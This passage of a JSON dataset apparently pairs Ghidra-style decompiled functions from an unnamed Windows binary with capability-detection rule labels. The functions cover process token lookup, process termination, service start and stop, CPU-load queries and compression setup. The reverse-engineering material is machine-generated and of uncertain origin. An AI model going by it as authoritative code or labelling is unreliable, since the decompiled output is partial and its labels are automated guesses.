        "decompiled_code": "\nvoid fcn.0046387c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    bool bVar4;\n    int32_t iStackY176;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint *TokenInformation;\n    uint TokenInformationLength;\n    uint TokenHandle;\n    uchar var_5h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    uStack64 = 0x463a19;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack68;\n    var_5h = 0;\n    iVar1 = sub.kernel32.dll_OpenProcess(0x400, 0);\n    if (iVar1 != 0) {\n        iVar2 = sub.advapi32.dll_OpenProcessToken(iVar1, 8, &TokenHandle);\n        if (iVar2 != 0) {\n            uVar3 = TokenHandle;\n            iVar2 = sub.advapi32.dll_GetTokenInformation(TokenHandle, 1, 0, 0, &TokenInformationLength);\n            TokenInformation = NULL;\n            while (bVar4 = iVar2 == 0,  bVar4) {\n                iVar2 = sub.kernel32.dll_GetLastError_1();\n                if (iVar2 != 0x7a) break;\n                fcn.00402f24();\n                uVar3 = TokenHandle;\n                iVar2 = sub.advapi32.dll_GetTokenInformation();\n            }\n            sub.kernel32.dll_CloseHandle_1(TokenHandle, uVar3);\n            if (bVar4) goto code_r0x004639fe;\n            var_1ch = 0;\n            var_20h = 0;\n            sub.advapi32.dll_LookupAccountSidA(0, *TokenInformation, 0, &var_1ch, 0, &var_20h, &var_18h);\n            if ((var_1ch != 0) && (var_20h != 0)) {\n                fcn.00405b8c();\n                fcn.00405b8c();\n                uVar3 = fcn.004058fc(&var_20h, &var_18h);\n                uVar3 = fcn.004058fc(&var_1ch, uVar3);\n                iVar2 = sub.advapi32.dll_LookupAccountSidA(0, *TokenInformation, uVar3);\n                if (iVar2 != 0) {\n                    var_5h = 1;\n                    fcn.004058fc();\n                    fcn.0040aa8c();\n                    fcn.004054c0();\n                    fcn.004058fc();\n                    fcn.0040aa8c();\n                    fcn.004054c0();\n                }\n            }\n            if (!bVar4) {\n                fcn.00402f0c();\n            }\n        }\n        sub.kernel32.dll_CloseHandle_1();\n        iStackY176 = iVar1;\n    }\ncode_r0x004639fe:\n    *in_FS_OFFSET = iStackY176;\n    fcn.00405490(0x463a20);\n    return;\n}\n",
        "token_count": 745
    },
    "00463a2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00463a2c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x463a43;\n    fcn.004058ec();\n    uStack28 = 0x463abc;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.004636c8();\n    fcn.0046387c();\n    fcn.00405504();\n    fcn.00405504();\n    uVar1 = 0;\n    fcn.00405800(0, 0x463adc, 0);\n    *in_FS_OFFSET = uVar1;\n    fcn.00405490(0x463ac3);\n    return;\n}\n",
        "token_count": 219
    },
    "00463be0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00463be0(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iVar1;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint uStack20;\n    int32_t hProcess;\n    uint lpExitCode;\n    \n    uStack20 = 0;\n    uStack24 = 1;\n    puStack28 = 0x463bf0;\n    hProcess = sub.kernel32.dll_OpenProcess();\n    if (hProcess != 0) {\n        uStack32 = 0x463c38;\n        iStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &stack0xfffffffc;\n        sub.kernel32.dll_GetExitCodeProcess(hProcess, &fcn.00463be0::lpExitCode);\n        iVar1 = hProcess;\n        sub.kernel32.dll_TerminateProcess(hProcess, lpExitCode);\n        *in_FS_OFFSET = iVar1;\n        sub.kernel32.dll_CloseHandle_1(hProcess, 0x463c3f);\n        return;\n    }\n    return;\n}\n",
        "token_count": 254
    },
    "00464394": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00464394(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint lpServiceStatus;\n    int32_t hSCManager;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = 0x4643a9;\n    var_8h = param_2;\n    fcn.004058ec();\n    puStack52 = 0x4643b1;\n    fcn.004058ec();\n    uStack56 = 0x46444f;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uStack64 = 0xf003f;\n    uStack68 = 0;\n    uStack72 = 0x4643ce;\n    puStack52 = &stack0xfffffffc;\n    uStack72 = fcn.004058fc();\n    puStack76 = 0x4643d4;\n    hSCManager = sub.advapi32.dll_OpenSCManagerA();\n    if (hSCManager != 0) {\n        uStack80 = 0x46442d;\n        uStack84 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffac;\n        puStack76 = &stack0xfffffffc;\n        uVar1 = fcn.004058fc(0xf01ff);\n        uVar1 = sub.advapi32.dll_OpenServiceA(hSCManager, uVar1);\n        sub.advapi32.dll_ControlService(uVar1, 1, &fcn.00464394::lpServiceStatus);\n        sub.advapi32.dll_CloseServiceHandle();\n        *in_FS_OFFSET = uVar1;\n        sub.advapi32.dll_CloseServiceHandle(hSCManager, 0x464434);\n        return;\n    }\n    *in_FS_OFFSET = uStack72;\n    uStack64 = 0x464456;\n    uStack68 = 0x46444e;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 497
    },
    "0046445c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046445c(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    int32_t hSCManager;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x464471;\n    var_8h = param_2;\n    fcn.004058ec();\n    puStack28 = 0x464479;\n    fcn.004058ec();\n    uStack32 = 0x46451c;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack40 = 0xf003f;\n    uStack44 = 0;\n    uStack48 = 0x464496;\n    puStack28 = &stack0xfffffffc;\n    uStack48 = fcn.004058fc();\n    puStack52 = 0x46449c;\n    hSCManager = sub.advapi32.dll_OpenSCManagerA();\n    if (hSCManager != 0) {\n        uStack56 = 0x4644fa;\n        uStack60 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc4;\n        puStack52 = &stack0xfffffffc;\n        uVar1 = fcn.004058fc(0xf01ff);\n        uVar1 = sub.advapi32.dll_OpenServiceA(hSCManager, uVar1);\n        var_10h = 0;\n        sub.advapi32.dll_StartServiceA(uVar1, 0, &fcn.0046445c::var_10h);\n        sub.advapi32.dll_CloseServiceHandle();\n        *in_FS_OFFSET = uVar1;\n        sub.advapi32.dll_CloseServiceHandle(hSCManager, 0x464501);\n        return;\n    }\n    *in_FS_OFFSET = uStack48;\n    uStack40 = 0x464523;\n    uStack44 = 0x46451b;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 505
    },
    "00464528": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint fcn.00464528(void)\n\n{\n    if (*0x498784 == 0) {\n        *0x498784 = sub.kernel32.dll_LoadLibraryA(0x464580);\n        if (*0x498784 < 0x20) {\n            *0x498784 = 0;\n            return 0;\n        }\n        *0x498788 = sub.kernel32.dll_GetProcAddress_1(*0x498784, 0x46458c);\n        *0x49878c = sub.kernel32.dll_GetProcAddress_1(*0x498784, 0x4645a0);\n    }\n    return 1;\n}\n",
        "token_count": 140
    },
    "00464824": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.00464824(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uchar uVar4;\n    uint var_2d4h;\n    uint var_2d0h;\n    uint var_2cch;\n    uint var_2c8h;\n    uint var_2c4h;\n    uint var_2c0h;\n    uint var_2bch;\n    uint var_2b8h;\n    uint var_2b4h;\n    uint var_2b0h;\n    uint var_2ach;\n    uint var_2a8h;\n    uint var_2a4h;\n    uint var_2a0h;\n    uint var_29ch;\n    uint var_298h;\n    uint var_294h;\n    uint var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint var_281h;\n    uint var_279h;\n    uint var_26dh;\n    uint var_269h;\n    uint var_265h;\n    uint var_25dh;\n    uint var_159h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 0x5a;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_20h = 0x464c99;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00464824::var_24h;\n    uVar1 = fcn.004614a0();\n    iVar2 = fcn.004614c0();\n    while (iVar2 != 0) {\n        iVar2 = sub.kernel32.dll_OpenProcess();\n        if (iVar2 != 0) {\n            fcn.004645b8(&fcn.00464824::var_20h);\n            fcn.00463674(0x12d);\n            fcn.004056dc();\n            iVar2 = fcn.00405a48();\n            uVar4 = iVar2 == 0;\n            if (0 < iVar2) {\n                fcn.004056dc();\n                fcn.0040a604();\n                fcn.004056dc();\n                fcn.0040a518();\n                fcn.00405964();\n                fcn.00405894();\n                if (uVar4) {\n                    fcn.004059a4();\n                    fcn.00463d78();\n                    fcn.0040a54c();\n                    fcn.00405784();\n                }\n                fcn.004056dc();\n                fcn.004637c0();\n                fcn.00405784();\n                fcn.00464794();\n                fcn.00409dd4(var_26dh);\n                fcn.00409dd4(var_279h);\n                fcn.00409ce8();\n                fcn.00463a2c();\n                fcn.00409dd4(var_269h);\n                fcn.00463ae0();\n                uVar3 = sub.kernel32.dll_GetCurrentProcessId();\n                fcn.00409dd4(uVar3);\n                fcn.00405800();\n            }\n            fcn.004056dc();\n            iVar2 = fcn.00405a48();\n            if (iVar2 == 0) {\n                fcn.004056dc();\n                fcn.0040a518();\n                fcn.004056dc();\n                fcn.0040a604();\n                fcn.00409dd4(var_26dh);\n                fcn.00409dd4(var_279h);\n                if (var_ch == 0) {\n                    fcn.00463d14();\n                }\n                fcn.004056dc();\n                fcn.004637c0();\n                fcn.00409ce8();\n                fcn.00463a2c();\n                fcn.00409dd4(var_269h);\n                fcn.00463ae0();\n                uVar3 = sub.kernel32.dll_GetCurrentProcessId();\n                fcn.00409dd4(uVar3);\n                fcn.00405800();\n            }\n            sub.kernel32.dll_CloseHandle_1();\n        }\n        iVar2 = fcn.004614e0();\n    }\n    sub.kernel32.dll_CloseHandle_1();\n    fcn.004054c0();\n    *in_FS_OFFSET = uVar1;\n    var_20h = 0x464ca0;\n    var_24h = 0x464c8b;\n    fcn.00405490();\n    var_24h = 0x464c98;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1160
    },
    "00465318": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00465318(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    uint uStack444;\n    uchar *puStack440;\n    uint uStack436;\n    uint uStack432;\n    uint uStack428;\n    uchar *puStack424;\n    uint uStack420;\n    uint uStack416;\n    uint32_t uStack140;\n    int32_t iStack136;\n    uchar auStack116 [40];\n    uint8_t uStack76;\n    int32_t iStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint32_t uStack56;\n    \n    uVar2 = 0;\n    uStack416 = 0;\n    uStack420 = 0x2c;\n    puStack424 = &stack0xffffffbc;\n    uStack428 = 0;\n    uStack432 = 0x465334;\n    iVar1 = sub.ntdll.dll_NtQuerySystemInformation();\n    if (iVar1 == 0) {\n        uStack432 = 0;\n        uStack436 = 0x20;\n        puStack440 = &stack0xffffff8c;\n        puVar4 = &stack0xfffffe44;\n        uStack444 = 3;\n        iVar1 = sub.ntdll.dll_NtQuerySystemInformation();\n        if (iVar1 == 0) {\n            uVar3 = 2;\n            iVar1 = sub.ntdll.dll_NtQuerySystemInformation(2, &stack0xfffffe44, 0x138, 0);\n            if (iVar1 == 0) {\n                if (*0x491984 != NULL || *0x491980 != 0) {\n                    iStack72 = uVar3 - *0x491980;\n                    puStack68 = puVar4 + (-(uVar3 < *0x491980) - *0x491984);\n                    iStack64 = uStack140 - *0x491988;\n                    iStack60 = (iStack136 - *0x49198c) - (uStack140 < *0x491988);\n                    uStack56 = uStack76;\n                    *0x491990 = fcn.00403450();\n                    if (*0x491984 != NULL || *0x491990 != *0x491980) {\n                        uVar2 = *0x491990;\n                    }\n                }\n                *0x491984 = puVar4;\n                *0x491980 = uVar3;\n                *0x491988 = uStack140;\n                *0x49198c = iStack136;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 595
    },
    "00467c5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00467c5c(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffeb8;\n    uint uVar5;\n    int32_t iStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint var_114h;\n    uint lpszFile;\n    uint hDrop;\n    uint hMem;\n    \n    puStack296 = &stack0xfffffffc;\n    uStack300 = 0x467d3c;\n    iStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack304;\n    fcn.0040546c();\n    fcn.00430e94();\n    iVar1 = fcn.00430d88();\n    if (iVar1 != 0) {\n        uVar2 = sub.kernel32.dll_GlobalLock(iVar1);\n        uVar5 = uVar2;\n        iVar3 = sub.shell32.dll_DragQueryFileA(uVar2, 0xffffffff, 0, 0);\n        if (-1 < iVar3 + -1) {\n            do {\n                uVar5 = uVar2;\n                sub.shell32.dll_DragQueryFileA();\n                iVar4 = fcn.0040a84c();\n                if (iVar4 != 0) {\n                    fcn.00405664(*in_EAX);\n                    uVar5 = 0x467d54;\n                    fcn.00405800();\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        sub.kernel32.dll_GlobalUnlock(iVar1, uVar5);\n        in_stack_fffffeb8 = iVar1;\n    }\n    *in_FS_OFFSET = in_stack_fffffeb8;\n    fcn.0040546c(0x467d43);\n    return;\n}\n",
        "token_count": 428
    },
    "004682b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nbool fcn.004682b8(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff70;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_1h;\n    \n    puStack24 = 0x4682cb;\n    fcn.00468500();\n    uStack28 = 0x46836f;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &fcn.004682b8::var_1h + 1;\n    if (*0x498798 != 0) {\n        puStack24 = &fcn.004682b8::var_1h + 1;\n        sub.user32.dll_SendMessageA(*0x498798, 0x40b, 0, 0);\n        sub.user32.dll_SendMessageA(*0x498798, 0x10, 0, 0);\n        *0x498798 = 0;\n    }\n    uVar1 = sub.user32.dll_GetDesktopWindow(0);\n    *0x498798 = (**0x4987a0)(0x468390, 0, 0, 0, 0, 0, uVar1);\n    iVar2 = sub.user32.dll_SendMessageA(*0x498798, 0x40a);\n    if (iVar2 != 1) {\n        sub.user32.dll_SendMessageA(*0x498798, 0x40b);\n        in_stack_ffffff70 = *0x498798;\n        sub.user32.dll_SendMessageA(*0x498798, 0x10, 0, 0);\n        *0x498798 = 0;\n    }\n    *0x4987a4 = in_EAX;\n    *in_FS_OFFSET = in_stack_ffffff70;\n    return iVar2 == 1;\n}\n",
        "token_count": 452
    },
    "004683cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004683cc(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    if (*0x498798 != 0) {\n        sub.user32.dll_SendMessageA(*0x498798, 0x43c, 0, 0);\n        sub.user32.dll_SendMessageA(*0x498798, 0x41e, 0, 0);\n        fcn.00430e94();\n        uVar1 = fcn.00430d88();\n    }\n    return uVar1;\n}\n",
        "token_count": 121
    },
    "0046875c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046875c(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack32 = 0x468772;\n    fcn.004058ec();\n    uStack36 = 0x468812;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (*0x4987b4 != NULL) {\n        puStack32 = &stack0xfffffffc;\n        fcn.00405504();\n        uVar1 = fcn.004058fc(0x4987ac);\n        iVar2 = (**0x4987b4)(uVar1);\n        if (iVar2 == 0) {\n            (**0x4987bc)(*0x4987ac, 0x468820, &fcn.0046875c::var_ch, &fcn.0046875c::var_10h, &fcn.0046875c::var_14h, \n                         &fcn.0046875c::var_18h);\n            (**0x4987c0)(*0x4987ac, 0x468820, fcn.0046856c, 0, &fcn.0046875c::var_18h);\n            (**0x4987c4)(var_18h);\n        }\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x468819;\n    uStack36 = 0x468809;\n    fcn.0040546c();\n    uStack36 = 0x468811;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 430
    },
    "00469ce4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00469ce4(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_stack_0000eff0;\n    \n    iVar1 = 0x10;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    fcn.00403aac();\n    fcn.00469cc8();\n    fcn.00469ce0();\n    iVar1 = (**(*in_stack_0000eff0 + 0xc))();\n    while (0 < iVar1) {\n        do {\n            fcn.0046a6e0();\n            fcn.00469ce0();\n            (**(*param_2 + 0x10))();\n        } while (iVar1 != 0);\n        iVar1 = (**(*in_stack_0000eff0 + 0xc))();\n    }\n    do {\n        fcn.0046a6e0();\n        iVar1 = fcn.00469ce0();\n        (**(*param_2 + 0x10))();\n    } while (iVar1 != 1);\n    fcn.0046a9a4();\n    fcn.00469ce0();\n    return;\n}\n",
        "token_count": 272
    },
    "0046a140": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046a140(int32_t arg_8h, char *arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *piVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t iVar3;\n    bool bVar4;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (((arg_ch == NULL) || (*arg_ch != *0x491a3c)) || (arg_8h != 0x38)) {\n        uVar1 = 0xfffffffa;\n    }\n    else if (in_EAX == 0) {\n        uVar1 = 0xfffffffe;\n    }\n    else {\n        *(in_EAX + 0x18) = 0;\n        if (*(in_EAX + 0x20) == 0) {\n            *(in_EAX + 0x20) = 0x469c8c;\n            *(in_EAX + 0x28) = 0;\n        }\n        if (*(in_EAX + 0x24) == 0) {\n            *(in_EAX + 0x24) = 0x469c98;\n        }\n        var_4h = in_EDX;\n        if (in_EDX == -1) {\n            var_4h = 6;\n        }\n        bVar4 = arg_18h < 0;\n        if (bVar4) {\n            arg_18h = -arg_18h;\n        }\n        var_ch = !bVar4;\n        if (((((arg_14h < 1) || (9 < arg_14h)) || ((in_ECX != 8 || ((arg_18h < 8 || (0xf < arg_18h)))))) || (var_4h < 0)\n            ) || (((9 < var_4h || (arg_10h < 0)) || (4 < arg_10h)))) {\n            uVar1 = 0xfffffffe;\n        }\n        else {\n            if (arg_18h == 8) {\n                arg_18h = 9;\n            }\n            piVar2 = (**(in_EAX + 0x20))();\n            if (piVar2 == NULL) {\n                uVar1 = 0xfffffffc;\n            }\n            else {\n                *(in_EAX + 0x1c) = piVar2;\n                *piVar2 = in_EAX;\n                piVar2[6] = var_ch;\n                piVar2[0xb] = arg_18h;\n                iVar3 = 1 << (arg_18h & 0x1f);\n                piVar2[10] = iVar3;\n                piVar2[0xc] = iVar3 + -1;\n                piVar2[0x13] = arg_14h + 7;\n                iVar3 = 1 << (arg_14h + 7 & 0x1f);\n                piVar2[0x12] = iVar3;\n                piVar2[0x14] = iVar3 + -1;\n                piVar2[0x15] = (piVar2[0x13] + 2U) / 3;\n                iVar3 = (**(in_EAX + 0x20))();\n                piVar2[0xd] = iVar3;\n                iVar3 = (**(in_EAX + 0x20))();\n                piVar2[0xf] = iVar3;\n                iVar3 = (**(in_EAX + 0x20))();\n                piVar2[0x10] = iVar3;\n                piVar2[0x5a6] = 1 << (arg_14h + 6U & 0x1f);\n                iVar3 = (**(in_EAX + 0x20))();\n                piVar2[2] = iVar3;\n                piVar2[3] = piVar2[0x5a6] << 2;\n                if (((piVar2[0xd] == 0) || (piVar2[0xf] == 0)) || ((piVar2[0x10] == 0 || (piVar2[2] == 0)))) {\n                    piVar2[1] = 0x29a;\n                    *(in_EAX + 0x18) = *0x4919b0;\n                    fcn.0046a9a4();\n                    uVar1 = 0xfffffffc;\n                }\n                else {\n                    piVar2[0x5a8] = iVar3 + (piVar2[0x5a6] & 0xfffffffeU);\n                    piVar2[0x5a5] = piVar2[0x5a6] * 3 + piVar2[2];\n                    piVar2[0x20] = var_4h;\n                    piVar2[0x21] = arg_10h;\n                    *(piVar2 + 8) = 8;\n                    uVar1 = fcn.0046a45c();\n                }\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 1159
    },
    "0046a45c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0046a45c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if ((((in_EAX != 0) && (*(in_EAX + 0x1c) != 0)) && (*(in_EAX + 0x20) != 0)) && (*(in_EAX + 0x24) != 0)) {\n        *(in_EAX + 0x14) = 0;\n        *(in_EAX + 8) = 0;\n        *(in_EAX + 0x18) = 0;\n        *(in_EAX + 0x2c) = 2;\n        iVar1 = *(in_EAX + 0x1c);\n        *(iVar1 + 0x14) = 0;\n        *(iVar1 + 0x10) = *(iVar1 + 8);\n        if (*(iVar1 + 0x18) < 0) {\n            *(iVar1 + 0x18) = -*(iVar1 + 0x18);\n        }\n        if (*(iVar1 + 0x18) == 0) {\n            uVar2 = 0x71;\n        }\n        else {\n            uVar2 = 0x2a;\n        }\n        *(iVar1 + 4) = uVar2;\n        uVar2 = fcn.00469e1c();\n        *(in_EAX + 0x30) = uVar2;\n        *(iVar1 + 0x24) = 0;\n        fcn.0046b880();\n        fcn.0046ac3c();\n        return 0;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 372
    },
    "0046a5ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046a5ec(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint in_ECX;\n    uint in_EDX;\n    \n    if ((in_EAX == 0) || (*(in_EAX + 0x1c) == 0)) {\n        uVar2 = 0xfffffffe;\n    }\n    else {\n        iVar1 = *(in_EAX + 0x1c);\n        *(iVar1 + 0x88) = in_EDX;\n        *(iVar1 + 0x7c) = in_ECX;\n        *(iVar1 + 0x8c) = arg_ch;\n        *(iVar1 + 0x78) = arg_8h;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 193
    },
    "0046a68c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
